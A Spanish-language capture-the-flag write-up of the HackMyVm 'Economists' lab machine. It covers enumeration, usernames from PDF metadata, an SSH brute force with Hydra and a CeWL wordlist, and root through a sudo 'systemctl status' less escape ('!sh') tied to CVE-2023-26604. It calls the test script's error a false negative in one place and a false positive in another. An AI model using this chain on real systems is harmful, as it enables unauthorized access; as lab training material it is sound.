---
title: "Economists HackMyVm - Writeup"
date: 2026-05-10 12:00:00 -0400
categories: [Writeups, HackMyVm]
tags: [web, bruteForce, stego, sudo-Misconfiguration]
image:
  path: /assets/img/Economists-img/economists.png
  alt: "Buffer Overflow Banner"
---

En este primera publicación se relatará cómo se resolvió la máquina [Economists](https://hackmyvm.eu/machines/machine.php?vm=Economists) de la plataforma HackMyVm.

| Autor | Dificultad | Sistema operativo | Plataforma | 
|-------|------------|-------------------|------------|
| eMVee | Fácil | Linux | HackMyVm |

# Resumen ejecutivo
La máquina **Economists** expone un servicio **FTP con acceso anónimo** que contiene varios archivos PDF cuyos metadatos, analizados con `exiftool`, revelan cuatro **nombres de usuario** del sistema: `joseph`, `richard`, `crystal` y `catherine`. En paralelo, el servicio **HTTP** (Apache 2.4.41) aloja un sitio web del que, mediante **scraping con CeWL**, se genera un diccionario de contraseñas personalizado basado en el contenido de la página. Combinando ambos insumos se realiza un **ataque de fuerza bruta con Hydra** contra el servicio SSH, obteniendo acceso inicial como el usuario `joseph` con la contraseña `wealthiest`. Durante la post-explotación se descubre en el directorio de `richard` un script `test.sh` que hace referencia al **CVE-2023-26604**, una vulnerabilidad de escalada de privilegios local que afecta a versiones de systemd anteriores a la 247; aunque el script arroja un falso negativo por un error de programación, la verificación manual confirma que la versión instalada es vulnerable. Dado que `joseph` tiene permiso para ejecutar `systemctl status` como `root` sin contraseña vía `sudo`, al invocar dicho comando se abre el paginador `less`, desde el cual se escapa a una **shell como root** escribiendo `!sh`. Por estas razones la máquina está catalogada con un nivel de dificultad **fácil**.


## Hosts discovery (descubrimiento de hosts)

![](/assets/img/Economists-img/1.png)

---

## Enumeración

```bash
# Nmap 7.99 scan initiated Thu May  7 21:05:32 2026 as: /usr/lib/nmap/nmap -p 21,22,80 -sCV -sS -Pn -vvv -oN nmap.txt -oX nmap.xml 192.168.0.200
Nmap scan report for elite-economists (192.168.0.200)
Host is up, received arp-response (0.00033s latency).
Scanned at 2026-05-07 21:05:32 -04 for 7s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCwXTk2hpk3kYCB9R/x6h/MZK0hZ2uK5iqjYUW7wyb6Rz/a8UbYu5XMJ63fRg6wZ5u1NWSb9A6j0OBoSoh74drbY7saloYgDtALyCLaXiSxOt2Va4Px10H8xaAZeSLwz/ZKiRHiyu4uh4B4Tf/vFGDe4Np3cfcO2ftQYwhqGGVeaIbCFTDbnZBwOJ+Ezgj2yJOGBYEeYU+au7BogSulWABGdGr9XmxApVmTaPvinWe89vqkiyc3CZHDPbrJu02cYm3aJFVpcCGBIx6wZcx2gC8W2wS3iStOfg4SILPfyZKLU6g2d9VF1jVwGQoeAoMmZgxF7bmF1J9ZcYAhN8JmMfT2++D+aK+p4K2gz5KPZjIUO02RKdMOdzSIqN6K7yQMKjdKw7Ig+d9qvzn54hYKUbvpxcnHnw2IhPcBytW6pndDQhyZ0g5RAzSRlO1nvgt6QMmOTG1X/3OOgtPbIH0DnDFMVcl5YEUM8c2ebng7gSSUJDnUOiTPPYTbpJsEgYGWbU=
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIVUhM/zlKMghGOQJ90nVnueTstnWLIWtn6ZH4zQDMqSM1vaX9Gtza7d2q0/91uTSyU7yx9pyjR7qnQwJUjTQFw=
|   256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIkYALtXLPsg30ZKCJbTRKnegoETlYTzlda2oKygf/cN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home - Elite Economists
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  7 21:05:39 2026 -- 1 IP address (1 host up) scanned in 7.07 seconds
```

| Vector | Servicio (Puerto) | Versión             | Qué permite                                              | Qué intentar             | Notas |
| ------ | ----------------- | ------------------- | -------------------------------------------------------- | ------------------------ | ----- |
| 1      | ftp (21)          | vsftpd 3.0.3        | Descarga y subida de archivos hacia la máquina víctima   | Acceso anónimo permitido |       |
| 2      | ssh (22)          | OpenSSH 8.2p1       | Acceso autenticado a la máquina                          | Buscar credenciales      |       |
| 3      | http (80)         | Apache httpd 2.4.41 | Gran abanico de vulnerabilidades web                     |                          |       |

### ftp (21)

Archivos dentro del servicio FTP expuesto con acceso anónimo:

```bash
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
```

Al analizar todos los archivos de forma superficial podemos ver que se repite el nombre de un dominio:

![](/assets/img/Economists-img/2.png)

Además, si usamos `exiftool` para extraer información útil de los metadatos podemos ver que hay diferentes autores para los archivos PDF:

```
joseph
richard
crystal
catherine
```

### http (80)

Archivos encontrados luego de enumerar directorios y archivos con gobuster:

```bash
index.html           (Status: 200) [Size: 35027]
images               (Status: 301) [Size: 315] [--> http://192.168.0.200/images/]
contact.html         (Status: 200) [Size: 14317]
about.html           (Status: 200) [Size: 23219]
blog.html            (Status: 200) [Size: 15196]
main.html            (Status: 200) [Size: 931]
services.html        (Status: 200) [Size: 17709]
css                  (Status: 301) [Size: 312] [--> http://192.168.0.200/css/]
js                   (Status: 301) [Size: 311] [--> http://192.168.0.200/js/]
cases.html           (Status: 200) [Size: 18018]
readme.txt           (Status: 200) [Size: 410]
fonts                (Status: 301) [Size: 314] [--> http://192.168.0.200/fonts/]
server-status        (Status: 403) [Size: 278]
```

Ninguno de los archivos encontrados resultó útil para determinar una forma de acceder al sistema. Junto a esto se enumeraron subdominios pero tampoco se encontró nada.

Para este caso se procedió a hacer una `wordlist` personalizada con el contenido de la página usando la herramienta `cewl`:

```bash
❯ cewl http://elite-economists.hmv -w customPass.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

---

## Explotación

Al momento de estar probando la `wordlist` podemos dar con la contraseña del usuario `joseph`:

```bash
❯ hydra -L customUsers.txt -P customPass.txt ssh://192.168.0.200
[22][ssh] host: 192.168.0.200   login: joseph   password: wealthiest
```

![](/assets/img/Economists-img/3.png)

---

## Post Explotación

Al ejecutar el comando `sudo -l` podemos ver lo siguiente:

```bash
User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
```

Este permiso tendrá sentido más adelante.

Luego, al estar enumerando el sistema buscando posibles formas de escalar privilegios, veo que podemos acceder al directorio personal del usuario `richard`, pudiendo ver que tiene los siguientes archivos:

```bash
-rwxrwxr-x 1 richard richard     143 Sep 12  2023 test.sh
-rw-rw-r-- 1 richard richard 2301155 Sep 13  2023 website.zip
```

---

## Escalada de privilegios

Al leer el script `test.sh` podemos ver el siguiente contenido:

```bash
#!/bin/sh

version=$(systemd --version | awk 'NR==1{print $2}')

if (($version lt 247)) then
	echo 'Vulnerable'
else
	echo 'Not vulnerable'
fi
```

Este script intenta validar la versión de systemd: si es menor a 247 imprime `Vulnerable` en la terminal y si es mayor o igual a 247 imprime `Not vulnerable`.

Este script hace referencia al **CVE-2023-26604**, el cual permite una **Escalada de Privilegios Locales (LPE)** a través del paginador `less` cuando se utiliza con `systemctl`. Cuando ejecutas comandos como `systemctl status` o `journalctl`, `systemd` suele abrir un paginador (generalmente `less`) para mostrar el contenido si este no cabe en la pantalla; desde aquí se puede escapar a una shell como root escribiendo `!sh`.

El script está mal programado ya que al momento de ejecutarlo da un falso positivo:

```bash
./test.sh: 5: 245: not found
Not vulnerable
```

Si verificamos de forma manual podemos ver que la versión es inferior a la 247, por lo que es posible efectuar esta escalada de privilegios. Para eso ejecutamos el comando `sudo /usr/bin/systemctl status` y dentro de `less` hay que escribir `!sh` para escapar la shell como root:

![](/assets/img/Economists-img/4.png)
